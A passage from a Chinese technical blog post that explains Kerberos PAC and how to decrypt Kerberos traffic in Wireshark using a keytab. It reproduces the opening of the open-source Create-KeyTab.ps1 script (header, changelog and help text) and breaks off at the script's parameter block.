</code></pre><blockquote><p>关于 PAC (特权属性证书) 的补充说明:</p><p>PAC 是微软为 Kerberos 协议引入的关键扩展，其核心作用是在票据中嵌入用户的身份标识和组信息，从而解决标准协议无法区分用户权限的问题。为确保其安全性和完整性，PAC 被封装在由 KDC 密钥加密的 TGT 内部，并且其本身附加了分别由 KDC 密钥和服务端密码哈希加密的两个数字签名。在最终的授权阶段，服务端会将这些签名提交给 KDC 进行有效性校验，KDC 在确认 PAC 未被篡改后，才会依据其中的用户信息返回最终的权限判定。</p></blockquote><h3 class=heading-element id=解密kerberos认证加密的流量><span>解密Kerberos认证加密的流量</span>
<a href=#%e8%a7%a3%e5%af%86kerberos%e8%ae%a4%e8%af%81%e5%8a%a0%e5%af%86%e7%9a%84%e6%b5%81%e9%87%8f class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><p>解密 Kerberos 认证加密的流量，需要制作 keytab 文件，并在 wireshark 中 协议 -> KRB5 导入制作好的 keytab 文件</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20251105142610867.png alt=/posts/5422d65/imgs/image-20251105142610867.png height=380 width=1047></p><p>制作 keytab 文件所需的 Realm(域名) 和 principal(主体名) 可以从 KRB5 的 AS-REP 中获取（这里要特别注意大小写）</p><p>因为这里的 salt（加密派生盐值）是 Realm + principal，并且保留了大小写，因此我们直接使用 salt 中的信息即可</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20251105142832603.png alt=/posts/5422d65/imgs/image-20251105142832603.png height=1330 width=1795></p><p>然后就可以用下面这几个方法制作 keytab 文件</p><p>方法一：可以借助<a href=https://github.com/TheRealAdamBurford/Create-KeyTab target=_blank rel="external nofollow noopener noreferrer">这个项目</a>生成 keytab 文件</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20251105142512436.png alt=/posts/5422d65/imgs/image-20251105142512436.png height=927 width=1734></p><p>为了预防线下断网的情况，我这里也贴一份这个 ps1 脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span><span class=lnt>158
</span><span class=lnt>159
</span><span class=lnt>160
</span><span class=lnt>161
</span><span class=lnt>162
</span><span class=lnt>163
</span><span class=lnt>164
</span><span class=lnt>165
</span><span class=lnt>166
</span><span class=lnt>167
</span><span class=lnt>168
</span><span class=lnt>169
</span><span class=lnt>170
</span><span class=lnt>171
</span><span class=lnt>172
</span><span class=lnt>173
</span><span class=lnt>174
</span><span class=lnt>175
</span><span class=lnt>176
</span><span class=lnt>177
</span><span class=lnt>178
</span><span class=lnt>179
</span><span class=lnt>180
</span><span class=lnt>181
</span><span class=lnt>182
</span><span class=lnt>183
</span><span class=lnt>184
</span><span class=lnt>185
</span><span class=lnt>186
</span><span class=lnt>187
</span><span class=lnt>188
</span><span class=lnt>189
</span><span class=lnt>190
</span><span class=lnt>191
</span><span class=lnt>192
</span><span class=lnt>193
</span><span class=lnt>194
</span><span class=lnt>195
</span><span class=lnt>196
</span><span class=lnt>197
</span><span class=lnt>198
</span><span class=lnt>199
</span><span class=lnt>200
</span><span class=lnt>201
</span><span class=lnt>202
</span><span class=lnt>203
</span><span class=lnt>204
</span><span class=lnt>205
</span><span class=lnt>206
</span><span class=lnt>207
</span><span class=lnt>208
</span><span class=lnt>209
</span><span class=lnt>210
</span><span class=lnt>211
</span><span class=lnt>212
</span><span class=lnt>213
</span><span class=lnt>214
</span><span class=lnt>215
</span><span class=lnt>216
</span><span class=lnt>217
</span><span class=lnt>218
</span><span class=lnt>219
</span><span class=lnt>220
</span><span class=lnt>221
</span><span class=lnt>222
</span><span class=lnt>223
</span><span class=lnt>224
</span><span class=lnt>225
</span><span class=lnt>226
</span><span class=lnt>227
</span><span class=lnt>228
</span><span class=lnt>229
</span><span class=lnt>230
</span><span class=lnt>231
</span><span class=lnt>232
</span><span class=lnt>233
</span><span class=lnt>234
</span><span class=lnt>235
</span><span class=lnt>236
</span><span class=lnt>237
</span><span class=lnt>238
</span><span class=lnt>239
</span><span class=lnt>240
</span><span class=lnt>241
</span><span class=lnt>242
</span><span class=lnt>243
</span><span class=lnt>244
</span><span class=lnt>245
</span><span class=lnt>246
</span><span class=lnt>247
</span><span class=lnt>248
</span><span class=lnt>249
</span><span class=lnt>250
</span><span class=lnt>251
</span><span class=lnt>252
</span><span class=lnt>253
</span><span class=lnt>254
</span><span class=lnt>255
</span><span class=lnt>256
</span><span class=lnt>257
</span><span class=lnt>258
</span><span class=lnt>259
</span><span class=lnt>260
</span><span class=lnt>261
</span><span class=lnt>262
</span><span class=lnt>263
</span><span class=lnt>264
</span><span class=lnt>265
</span><span class=lnt>266
</span><span class=lnt>267
</span><span class=lnt>268
</span><span class=lnt>269
</span><span class=lnt>270
</span><span class=lnt>271
</span><span class=lnt>272
</span><span class=lnt>273
</span><span class=lnt>274
</span><span class=lnt>275
</span><span class=lnt>276
</span><span class=lnt>277
</span><span class=lnt>278
</span><span class=lnt>279
</span><span class=lnt>280
</span><span class=lnt>281
</span><span class=lnt>282
</span><span class=lnt>283
</span><span class=lnt>284
</span><span class=lnt>285
</span><span class=lnt>286
</span><span class=lnt>287
</span><span class=lnt>288
</span><span class=lnt>289
</span><span class=lnt>290
</span><span class=lnt>291
</span><span class=lnt>292
</span><span class=lnt>293
</span><span class=lnt>294
</span><span class=lnt>295
</span><span class=lnt>296
</span><span class=lnt>297
</span><span class=lnt>298
</span><span class=lnt>299
</span><span class=lnt>300
</span><span class=lnt>301
</span><span class=lnt>302
</span><span class=lnt>303
</span><span class=lnt>304
</span><span class=lnt>305
</span><span class=lnt>306
</span><span class=lnt>307
</span><span class=lnt>308
</span><span class=lnt>309
</span><span class=lnt>310
</span><span class=lnt>311
</span><span class=lnt>312
</span><span class=lnt>313
</span><span class=lnt>314
</span><span class=lnt>315
</span><span class=lnt>316
</span><span class=lnt>317
</span><span class=lnt>318
</span><span class=lnt>319
</span><span class=lnt>320
</span><span class=lnt>321
</span><span class=lnt>322
</span><span class=lnt>323
</span><span class=lnt>324
</span><span class=lnt>325
</span><span class=lnt>326
</span><span class=lnt>327
</span><span class=lnt>328
</span><span class=lnt>329
</span><span class=lnt>330
</span><span class=lnt>331
</span><span class=lnt>332
</span><span class=lnt>333
</span><span class=lnt>334
</span><span class=lnt>335
</span><span class=lnt>336
</span><span class=lnt>337
</span><span class=lnt>338
</span><span class=lnt>339
</span><span class=lnt>340
</span><span class=lnt>341
</span><span class=lnt>342
</span><span class=lnt>343
</span><span class=lnt>344
</span><span class=lnt>345
</span><span class=lnt>346
</span><span class=lnt>347
</span><span class=lnt>348
</span><span class=lnt>349
</span><span class=lnt>350
</span><span class=lnt>351
</span><span class=lnt>352
</span><span class=lnt>353
</span><span class=lnt>354
</span><span class=lnt>355
</span><span class=lnt>356
</span><span class=lnt>357
</span><span class=lnt>358
</span><span class=lnt>359
</span><span class=lnt>360
</span><span class=lnt>361
</span><span class=lnt>362
</span><span class=lnt>363
</span><span class=lnt>364
</span><span class=lnt>365
</span><span class=lnt>366
</span><span class=lnt>367
</span><span class=lnt>368
</span><span class=lnt>369
</span><span class=lnt>370
</span><span class=lnt>371
</span><span class=lnt>372
</span><span class=lnt>373
</span><span class=lnt>374
</span><span class=lnt>375
</span><span class=lnt>376
</span><span class=lnt>377
</span><span class=lnt>378
</span><span class=lnt>379
</span><span class=lnt>380
</span><span class=lnt>381
</span><span class=lnt>382
</span><span class=lnt>383
</span><span class=lnt>384
</span><span class=lnt>385
</span><span class=lnt>386
</span><span class=lnt>387
</span><span class=lnt>388
</span><span class=lnt>389
</span><span class=lnt>390
</span><span class=lnt>391
</span><span class=lnt>392
</span><span class=lnt>393
</span><span class=lnt>394
</span><span class=lnt>395
</span><span class=lnt>396
</span><span class=lnt>397
</span><span class=lnt>398
</span><span class=lnt>399
</span><span class=lnt>400
</span><span class=lnt>401
</span><span class=lnt>402
</span><span class=lnt>403
</span><span class=lnt>404
</span><span class=lnt>405
</span><span class=lnt>406
</span><span class=lnt>407
</span><span class=lnt>408
</span><span class=lnt>409
</span><span class=lnt>410
</span><span class=lnt>411
</span><span class=lnt>412
</span><span class=lnt>413
</span><span class=lnt>414
</span><span class=lnt>415
</span><span class=lnt>416
</span><span class=lnt>417
</span><span class=lnt>418
</span><span class=lnt>419
</span><span class=lnt>420
</span><span class=lnt>421
</span><span class=lnt>422
</span><span class=lnt>423
</span><span class=lnt>424
</span><span class=lnt>425
</span><span class=lnt>426
</span><span class=lnt>427
</span><span class=lnt>428
</span><span class=lnt>429
</span><span class=lnt>430
</span><span class=lnt>431
</span><span class=lnt>432
</span><span class=lnt>433
</span><span class=lnt>434
</span><span class=lnt>435
</span><span class=lnt>436
</span><span class=lnt>437
</span><span class=lnt>438
</span><span class=lnt>439
</span><span class=lnt>440
</span><span class=lnt>441
</span><span class=lnt>442
</span><span class=lnt>443
</span><span class=lnt>444
</span><span class=lnt>445
</span><span class=lnt>446
</span><span class=lnt>447
</span><span class=lnt>448
</span><span class=lnt>449
</span><span class=lnt>450
</span><span class=lnt>451
</span><span class=lnt>452
</span><span class=lnt>453
</span><span class=lnt>454
</span><span class=lnt>455
</span><span class=lnt>456
</span><span class=lnt>457
</span><span class=lnt>458
</span><span class=lnt>459
</span><span class=lnt>460
</span><span class=lnt>461
</span><span class=lnt>462
</span><span class=lnt>463
</span><span class=lnt>464
</span><span class=lnt>465
</span><span class=lnt>466
</span><span class=lnt>467
</span><span class=lnt>468
</span><span class=lnt>469
</span><span class=lnt>470
</span><span class=lnt>471
</span><span class=lnt>472
</span><span class=lnt>473
</span><span class=lnt>474
</span><span class=lnt>475
</span><span class=lnt>476
</span><span class=lnt>477
</span><span class=lnt>478
</span><span class=lnt>479
</span><span class=lnt>480
</span><span class=lnt>481
</span><span class=lnt>482
</span><span class=lnt>483
</span><span class=lnt>484
</span><span class=lnt>485
</span><span class=lnt>486
</span><span class=lnt>487
</span><span class=lnt>488
</span><span class=lnt>489
</span><span class=lnt>490
</span><span class=lnt>491
</span><span class=lnt>492
</span><span class=lnt>493
</span><span class=lnt>494
</span><span class=lnt>495
</span><span class=lnt>496
</span><span class=lnt>497
</span><span class=lnt>498
</span><span class=lnt>499
</span><span class=lnt>500
</span><span class=lnt>501
</span><span class=lnt>502
</span><span class=lnt>503
</span><span class=lnt>504
</span><span class=lnt>505
</span><span class=lnt>506
</span><span class=lnt>507
</span><span class=lnt>508
</span><span class=lnt>509
</span><span class=lnt>510
</span><span class=lnt>511
</span><span class=lnt>512
</span><span class=lnt>513
</span><span class=lnt>514
</span><span class=lnt>515
</span><span class=lnt>516
</span><span class=lnt>517
</span><span class=lnt>518
</span><span class=lnt>519
</span><span class=lnt>520
</span><span class=lnt>521
</span><span class=lnt>522
</span><span class=lnt>523
</span><span class=lnt>524
</span><span class=lnt>525
</span><span class=lnt>526
</span><span class=lnt>527
</span><span class=lnt>528
</span><span class=lnt>529
</span><span class=lnt>530
</span><span class=lnt>531
</span><span class=lnt>532
</span><span class=lnt>533
</span><span class=lnt>534
</span><span class=lnt>535
</span><span class=lnt>536
</span><span class=lnt>537
</span><span class=lnt>538
</span><span class=lnt>539
</span><span class=lnt>540
</span><span class=lnt>541
</span><span class=lnt>542
</span><span class=lnt>543
</span><span class=lnt>544
</span><span class=lnt>545
</span><span class=lnt>546
</span><span class=lnt>547
</span><span class=lnt>548
</span><span class=lnt>549
</span><span class=lnt>550
</span><span class=lnt>551
</span><span class=lnt>552
</span><span class=lnt>553
</span><span class=lnt>554
</span><span class=lnt>555
</span><span class=lnt>556
</span><span class=lnt>557
</span><span class=lnt>558
</span><span class=lnt>559
</span><span class=lnt>560
</span><span class=lnt>561
</span><span class=lnt>562
</span><span class=lnt>563
</span><span class=lnt>564
</span><span class=lnt>565
</span><span class=lnt>566
</span><span class=lnt>567
</span><span class=lnt>568
</span><span class=lnt>569
</span><span class=lnt>570
</span><span class=lnt>571
</span><span class=lnt>572
</span><span class=lnt>573
</span><span class=lnt>574
</span><span class=lnt>575
</span><span class=lnt>576
</span><span class=lnt>577
</span><span class=lnt>578
</span><span class=lnt>579
</span><span class=lnt>580
</span><span class=lnt>581
</span><span class=lnt>582
</span><span class=lnt>583
</span><span class=lnt>584
</span><span class=lnt>585
</span><span class=lnt>586
</span><span class=lnt>587
</span><span class=lnt>588
</span><span class=lnt>589
</span><span class=lnt>590
</span><span class=lnt>591
</span><span class=lnt>592
</span><span class=lnt>593
</span><span class=lnt>594
</span><span class=lnt>595
</span><span class=lnt>596
</span><span class=lnt>597
</span><span class=lnt>598
</span><span class=lnt>599
</span><span class=lnt>600
</span><span class=lnt>601
</span><span class=lnt>602
</span><span class=lnt>603
</span><span class=lnt>604
</span><span class=lnt>605
</span><span class=lnt>606
</span><span class=lnt>607
</span><span class=lnt>608
</span><span class=lnt>609
</span><span class=lnt>610
</span><span class=lnt>611
</span><span class=lnt>612
</span><span class=lnt>613
</span><span class=lnt>614
</span><span class=lnt>615
</span><span class=lnt>616
</span><span class=lnt>617
</span><span class=lnt>618
</span><span class=lnt>619
</span><span class=lnt>620
</span><span class=lnt>621
</span><span class=lnt>622
</span><span class=lnt>623
</span><span class=lnt>624
</span><span class=lnt>625
</span><span class=lnt>626
</span><span class=lnt>627
</span><span class=lnt>628
</span><span class=lnt>629
</span><span class=lnt>630
</span><span class=lnt>631
</span><span class=lnt>632
</span><span class=lnt>633
</span><span class=lnt>634
</span><span class=lnt>635
</span><span class=lnt>636
</span><span class=lnt>637
</span><span class=lnt>638
</span><span class=lnt>639
</span><span class=lnt>640
</span><span class=lnt>641
</span><span class=lnt>642
</span><span class=lnt>643
</span><span class=lnt>644
</span><span class=lnt>645
</span><span class=lnt>646
</span><span class=lnt>647
</span><span class=lnt>648
</span><span class=lnt>649
</span><span class=lnt>650
</span><span class=lnt>651
</span><span class=lnt>652
</span><span class=lnt>653
</span><span class=lnt>654
</span><span class=lnt>655
</span><span class=lnt>656
</span><span class=lnt>657
</span><span class=lnt>658
</span><span class=lnt>659
</span><span class=lnt>660
</span><span class=lnt>661
</span><span class=lnt>662
</span><span class=lnt>663
</span><span class=lnt>664
</span><span class=lnt>665
</span><span class=lnt>666
</span><span class=lnt>667
</span><span class=lnt>668
</span><span class=lnt>669
</span><span class=lnt>670
</span><span class=lnt>671
</span><span class=lnt>672
</span><span class=lnt>673
</span><span class=lnt>674
</span><span class=lnt>675
</span><span class=lnt>676
</span><span class=lnt>677
</span><span class=lnt>678
</span><span class=lnt>679
</span><span class=lnt>680
</span><span class=lnt>681
</span><span class=lnt>682
</span><span class=lnt>683
</span><span class=lnt>684
</span><span class=lnt>685
</span><span class=lnt>686
</span><span class=lnt>687
</span><span class=lnt>688
</span><span class=lnt>689
</span><span class=lnt>690
</span><span class=lnt>691
</span><span class=lnt>692
</span><span class=lnt>693
</span><span class=lnt>694
</span><span class=lnt>695
</span><span class=lnt>696
</span><span class=lnt>697
</span><span class=lnt>698
</span><span class=lnt>699
</span><span class=lnt>700
</span><span class=lnt>701
</span><span class=lnt>702
</span><span class=lnt>703
</span><span class=lnt>704
</span><span class=lnt>705
</span><span class=lnt>706
</span><span class=lnt>707
</span><span class=lnt>708
</span><span class=lnt>709
</span><span class=lnt>710
</span><span class=lnt>711
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-powershell data-lang=powershell><span class=line><span class=cl><span class=cm>&lt;#PSScriptInfo
</span></span></span><span class=line><span class=cl><span class=cm>.VERSION 1.0.2
</span></span></span><span class=line><span class=cl><span class=cm>.GUID 325f7f9a-87be-42ec-ba96-c5e423718284
</span></span></span><span class=line><span class=cl><span class=cm>.AUTHOR TRAB
</span></span></span><span class=line><span class=cl><span class=cm>.COMPANYNAME
</span></span></span><span class=line><span class=cl><span class=cm>.COPYRIGHT
</span></span></span><span class=line><span class=cl><span class=cm>.TAGS KeyTab Ktpass Key Tab
</span></span></span><span class=line><span class=cl><span class=cm>.LICENSEURI https://github.com/TheRealAdamBurford/Create-KeyTab/blob/master/LICENSE
</span></span></span><span class=line><span class=cl><span class=cm>.PROJECTURI https://github.com/TheRealAdamBurford/Create-KeyTab
</span></span></span><span class=line><span class=cl><span class=cm>.ICONURI
</span></span></span><span class=line><span class=cl><span class=cm>.EXTERNALMODULEDEPENDENCIES 
</span></span></span><span class=line><span class=cl><span class=cm>.REQUIREDSCRIPTS
</span></span></span><span class=line><span class=cl><span class=cm>.EXTERNALSCRIPTDEPENDENCIES
</span></span></span><span class=line><span class=cl><span class=cm>.RELEASENOTES
</span></span></span><span class=line><span class=cl><span class=cm>.PRIVATEDATA
</span></span></span><span class=line><span class=cl><span class=cm>#&gt;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>&lt;# 
</span></span></span><span class=line><span class=cl><span class=cm>.</span><span class=sd>DESCRIPTION</span><span class=cm> 
</span></span></span><span class=line><span class=cl><span class=cm> This scipt will generate off-line keytab files for use with Active Directory (AD). While the script is designed to work independently of AD, this script can be used with a wrapper script that uses Get-ADUser or Get-ADObject to retrieve the UPN of a samaccountname or a list of samaccountnames for use in batch processing of KeyTab creation. More information at https://therealadamburford.github.io/Create-KeyTab/ 
</span></span></span><span class=line><span class=cl><span class=cm>#&gt;</span> 
</span></span><span class=line><span class=cl><span class=c>##########################################################</span>
</span></span><span class=line><span class=cl><span class=c>###</span>
</span></span><span class=line><span class=cl><span class=c>###      Create-KeyTab.ps1</span>
</span></span><span class=line><span class=cl><span class=c>###</span>
</span></span><span class=line><span class=cl><span class=c>###      Created : 2019-10-26</span>
</span></span><span class=line><span class=cl><span class=c>###      Modified: 2020-10-26</span>
</span></span><span class=line><span class=cl><span class=c>###</span>
</span></span><span class=line><span class=cl><span class=c>###      Created By : Adam Burford</span>
</span></span><span class=line><span class=cl><span class=c>###      Modified By: Adam Burford</span>
</span></span><span class=line><span class=cl><span class=c>###</span>
</span></span><span class=line><span class=cl><span class=c>###</span>
</span></span><span class=line><span class=cl><span class=c>### Notes: Create RC4-HMAC, AES128. AES256 KeyTab file. Does not use AD. </span>
</span></span><span class=line><span class=cl><span class=c>### Password, ServicePRincipal/UPN must be set on AD account.</span>
</span></span><span class=line><span class=cl><span class=c>### Future add may include option AD lookup for Kvno, SPN and UPN.</span>
</span></span><span class=line><span class=cl><span class=c>###</span>
</span></span><span class=line><span class=cl><span class=c>### 2019-11-11 - Added custom SALT option</span>
</span></span><span class=line><span class=cl><span class=c>### 2019-11-11 - Added current Epoch Time Stamp.</span>
</span></span><span class=line><span class=cl><span class=c>### 2019-11-12 - Added -Append option</span>
</span></span><span class=line><span class=cl><span class=c>### 2019-11-12 - Added -Quiet and -NoPrompt switches for use in batch mode</span>
</span></span><span class=line><span class=cl><span class=c>### 2019-11-14 - Added support for UPN format primary/principal (e.g. host/www.domain.com). The principal is split into an array. </span>
</span></span><span class=line><span class=cl><span class=c>###              The slash is removed from the SALT calculation.</span>
</span></span><span class=line><span class=cl><span class=c>###</span>
</span></span><span class=line><span class=cl><span class=c>### 2019-11-18 - Changed output text. RC4,AES128,AES256</span>
</span></span><span class=line><span class=cl><span class=c>### 2019-11-18 - Created static nFold output.</span>
</span></span><span class=line><span class=cl><span class=c>### 2019-11-26 - Added a Get-Password function to mask password prompt input</span>
</span></span><span class=line><span class=cl><span class=c>### 2020-01-30 - Add Info for posting to https://www.powershellgallery.com</span>
</span></span><span class=line><span class=cl><span class=c>### 2020-09-15 - Added suggested use of [decimal]::Parse from &#34;https://github.com/matherm-aboehm&#34; to fix timestamp error on localized versions of Windows. Line 535.</span>
</span></span><span class=line><span class=cl><span class=c>### 2020-10-26 - Add KRB5_NT_SRV_HST to possible PType values</span>
</span></span><span class=line><span class=cl><span class=c>###</span>
</span></span><span class=line><span class=cl><span class=c>##########################################################</span>
</span></span><span class=line><span class=cl><span class=c>### Attribution:</span>
</span></span><span class=line><span class=cl><span class=c>### https://tools.ietf.org/html/rfc3961</span>
</span></span><span class=line><span class=cl><span class=c>### https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625?redirectedfrom=MSDN</span>
</span></span><span class=line><span class=cl><span class=c>### https://github.com/dfinke/powershell-algorithms/blob/master/src/algorithms/math/euclidean-algorithm/euclideanAlgorithm.ps1</span>
</span></span><span class=line><span class=cl><span class=c>### https://afana.me/archive/2016/12/29/how-mit-keytab-files-store-passwords.aspx/</span>
</span></span><span class=line><span class=cl><span class=c>### http://www.ioplex.com/utilities/keytab.txt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cm>&lt;#
</span></span></span><span class=line><span class=cl><span class=cm>.</span><span class=sd>SYNOPSIS</span><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>This script will generate and append version 502 KeyTab files
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>.</span><span class=sd>DESCRIPTION</span><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>Required Parameters
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>-Realm     : The Realm for the KeyTab
</span></span></span><span class=line><span class=cl><span class=cm>-Principal : The Principal for the KeyTab. Case sensative for AES SALT. Default REALM+Principal
</span></span></span><span class=line><span class=cl><span class=cm>-Password  : 
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>Optional Parameters
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>-SALT      : Use a custom SALT
</span></span></span><span class=line><span class=cl><span class=cm>-File      : KeyTab File Path. Default = CurrentDirectory\login.keytab
</span></span></span><span class=line><span class=cl><span class=cm>-KVNO      : Default = 1. Exceeding 255 will wrap the KVNO. THe 32bit KVNO field is not implimented.
</span></span></span><span class=line><span class=cl><span class=cm>-PType     : Default = KRB5_NT_PRINCIPAL
</span></span></span><span class=line><span class=cl><span class=cm>-RC4       : Generate RC4 Key
</span></span></span><span class=line><span class=cl><span class=cm>-AES128    : Generate AES128 Key
</span></span></span><span class=line><span class=cl><span class=cm>-AES256    : Generate AES256 Key - This is default if no Etype switch is set.
</span></span></span><span class=line><span class=cl><span class=cm>-Append    : Append Key Data to an existing KeyTab file.
</span></span></span><span class=line><span class=cl><span class=cm>-Quiet     : Suppress Text Output
</span></span></span><span class=line><span class=cl><span class=cm>-NoPrompt  : Suppress Write KeyTab File Prompt
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>.</span><span class=sd>EXAMPLE</span><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>.\Create-KeyTab.ps1
</span></span></span><span class=line><span class=cl><span class=cm>.</span><span class=sd>EXAMPLE</span><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>.\Create-KeyTab.ps1 -AES256 -AES128 -RC4
</span></span></span><span class=line><span class=cl><span class=cm>.</span><span class=sd>EXAMPLE</span><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>.\Create-KeyTab.ps1 -AES256 -AES128 -Append
</span></span></span><span class=line><span class=cl><span class=cm>.</span><span class=sd>EXAMPLE</span><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>.\Create-KeyTab.ps1 -AES256 -AES128 -SALT &#34;MY.REALM.COMprincipalname&#34;
</span></span></span><span class=line><span class=cl><span class=cm>.</span><span class=sd>EXAMPLE</span><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>.\Create-KeyTab.ps1 -Realm &#34;MY.REALM.COM&#34; -Principal &#34;principalname&#34; -Password &#34;Secret&#34; -File &#34;c:\temp\login.keytab&#34;
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>.</span><span class=sd>NOTES</span><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>Use -QUIET and -NOPROMPT for batch mode processing.
</span></span></span><span class=line><span class=cl><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>.</span><span class=sd>LINK</span><span class=cm>
</span></span></span><span class=line><span class=cl><span class=cm>https://www.linkedin.com/in/adamburford
</span></span></span><span class=line><span class=cl><span class=cm>#&gt;</span>
</span></span><span class=line><span class=cl><span class=k>param</span> <span class=p>(</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=nb>Parameter</span><span class=p>(</span><span class=na>Mandatory</span><span class=p>=</span><span class=vm>$true</span><span class=p>,</span><span class=na>HelpMessage</span><span class=p>=</span><span class=s2>&#34;REALM name will be forced to Upper Case&#34;</span><span class=p>)]</span><span class=nv>$Realm</span><span class=p>,</span>
